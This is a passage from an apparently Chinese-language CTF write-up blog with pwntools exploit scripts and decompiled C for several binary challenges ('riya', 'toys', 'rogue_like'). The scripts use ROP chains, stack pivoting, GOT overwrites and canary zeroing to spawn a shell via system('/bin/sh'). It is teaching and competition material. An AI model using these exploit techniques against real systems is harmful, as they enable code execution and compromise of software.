operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.94.84.92'</span><span class="token punctuation">,</span> <span class="token number">30857</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setvbuf'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040201a</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x000000000010f75b</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'certificate'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x4025E6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'certificate'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="riya"><a href="#riya" class="headerlink" title="riya"></a>riya</h2><p>输入 n 直接跳到 LABEL_10 送 shell</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"y/n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token char">'Y'</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token char">'Y'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>LABEL_10<span class="token operator">:</span>      <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0x3E8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token char">'n'</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_10<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token char">'y'</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_11<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="toys"><a href="#toys" class="headerlink" title="toys"></a>toys</h2><p>这题只有一个栈溢出，还没什么 gadgets</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-80h] BYREF</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There are no toys here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0x1337</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x80</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Too many!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路：</p><ul><li>由于缺少 pop_rdi_ret 等 gadgets，而且程序中的 puts 输出的都是 rodata 段的数据，而 strlen_len 的参数是 rbp - 0x80，所以需要改 strlen_got 为 puts_plt 去泄露在 rbp - 0x80提前布置好的 libc 地址</li><li>修改 strlen_got 的方法是利用 fgets 向 rbp - 0x80 的位置写，修改 rbp 为 strlen_got + 0x80 再用 fgets 输入就能覆盖 strlen_got 为 puts_plt</li><li>直接把栈迁移到 got 表那块会覆盖到其他有用的地址，所以需要迁移到程序段高地址去写 rop 链，其中一次输入在 strlen_got + 0x80</li></ul><p>exp分析：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>main <span class="token operator">=</span> <span class="token number">0x401274</span>got_addr <span class="token operator">=</span> <span class="token number">0x404000</span>leave_ret <span class="token operator">=</span> <span class="token number">0x00000000004012cd</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>strlen_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span>strlen <span class="token operator">=</span> <span class="token number">0x40128C</span>p <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x80</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b':'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x80</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x98</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>strlen<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x700</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'OK'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x820</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x830</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x810</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'OK'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'OK'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x88540</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.39/libc.so.6'</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000010f75b</span>p <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'OK'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>p = b&#39;\x00&#39; * 0x80 + p64(got_addr + 0x800) + p64(main)</code></p><p>&#x3D;&gt; rbp &#x3D; got + 0x800</p><p><code>p = b&#39;\x00&#39; * 0x80 + p64(got_addr + 0x100) + p64(main) + p64(strlen_got + 0x80) + p64(main) + p64(strlen_got + 0x98) + p64(strlen) + p64(strlen_got + 0x700) + p64(main)</code></p><p>&#x3D;&gt; rbp &#x3D; got + 0x100</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">got <span class="token operator">+</span> <span class="token number">0x800</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>got <span class="token operator">+</span> <span class="token number">0x810</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x80</span><span class="token punctuation">)</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>got <span class="token operator">+</span> <span class="token number">0x820</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x98</span><span class="token punctuation">)</span> p64<span class="token punctuation">(</span>strlen<span class="token punctuation">)</span>got <span class="token operator">+</span> <span class="token number">0x830</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">0x700</span><span class="token punctuation">)</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>p = p64(0) + p64(got_addr + 0x820) + p64(leave_ret) + p64(0) + p64(got_addr + 0x830) + p64(leave_ret) p = p.ljust(0x80, b&#39;\x00&#39;) + p64(got_addr + 0x810) + p64(leave_ret)</code></p><p>&#x3D;&gt; rbp &#x3D; got + 0x810</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">got <span class="token operator">+</span> <span class="token number">0x80</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>     p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x820</span><span class="token punctuation">)</span> got <span class="token operator">+</span> <span class="token number">0x90</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>   p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>got <span class="token operator">+</span> <span class="token number">0xa0</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x830</span><span class="token punctuation">)</span>  p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">got <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>got_addr <span class="token operator">+</span> <span class="token number">0x810</span><span class="token punctuation">)</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来的程序流： </p><ul><li><p>leave_ret 迁移到 got_addr + 0x818，执行 main</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rbp <span class="token punctuation">:</span> got <span class="token operator">+</span> <span class="token number">0x100</span><span class="token operator">=</span><span class="token operator">></span>got <span class="token operator">+</span> <span class="token number">0x810</span><span class="token operator">=</span><span class="token operator">></span> strlen_got <span class="token operator">+</span> <span class="token number">0x80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>两次 pop rbp 后 rbp 变成 strlen_got + 0x80</p></li><li><p>此时 fgets 就是向 rbp - 0x80 即 strlen_got 读，发送 p64(puts_plt) 即可改 strlen_got 为 puts_plt</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rbp <span class="token punctuation">:</span> strlen_got <span class="token operator">+</span> <span class="token number">0x80</span> <span class="token operator">=</span> got <span class="token operator">+</span> <span class="token number">0x88</span> <span class="token operator">=</span><span class="token operator">></span> got_addr <span class="token operator">+</span> <span class="token number">0x820</span> <span class="token operator">=</span><span class="token operator">></span> strlen_got <span class="token operator">+</span> <span class="token number">0x98</span> <span class="token operator">=</span> got <span class="token operator">+</span> <span class="token number">0xa0</span>ret <span class="token punctuation">:</span> got <span class="token operator">+</span> <span class="token number">0x90</span> <span class="token operator">=</span><span class="token operator">></span> leave_ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>leave_ret 迁移到 rbp + 8 &#x3D; got_addr + 0x828 &#x3D;&gt; strlen，执行 main 中的 strlen，迁移时执行两次 pop rbp 使 rbp 变成 got + 0xa0</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rbp <span class="token punctuation">:</span> got <span class="token operator">+</span> <span class="token number">0xa0</span> <span class="token operator">=</span><span class="token operator">></span> got_addr <span class="token operator">+</span> <span class="token number">0x830</span>ret <span class="token punctuation">:</span> got <span class="token operator">+</span> <span class="token number">0xa8</span> <span class="token operator">=</span><span class="token operator">></span> leave_ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以 strlen 的一参是 rbp - 0x80 &#x3D; got + 0x20 &#x3D; setvbuf_got，而 strlen_got 已经被改成 puts_plt，相当于执行 puts 输出了 setvbuf_got，最后 ret 是 leave_ret</p></li><li><p>再次迁移到 rbp + 8 &#x3D; got_addr + 0x838 &#x3D; main，最后一次利用栈溢出写 rop 链执行 system(‘&#x2F;bin&#x2F;sh’)</p></li></ul><h2 id="rogue-like"><a href="#rogue-like" class="headerlink" title="rogue_like"></a>rogue_like</h2><p>本题有三次选择：</p><p>第一次选择一个武器，有三个选择，case 1 设置 libc 中任意 64 位地址为 0，case 2 写 libc 中任意地址一个 byte，case 3 泄露 &#x2F;proc&#x2F;self&#x2F;maps 中的地址；</p><p>第二次选择一个祝福，case 1 会崩溃，case 2 和 case 3 功能 都是给任意地址加上 5 以内的值；</p><p>第三次选择一个挑战，case 1 溢出 0x10，case 2 输出 0x120 后输入 0xf0，无溢出，case 3 两次 read，一次刚好到 rbp，并且存在栈的 off-by-null</p><p>但是题目开了 canary，所以需要组合三次选择来绕过 canary 并且执行 rop</p><p>思路：第一次选 1，改 tls 中的 canary 为 0，第二次选 2，让 got 表中的 alarm + 5 得到 syscall，第三次选 3，程序中已经有 &#x2F;bin&#x2F;sh，再利用第二次 read 控制 rax 执行 syscall 即可</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span 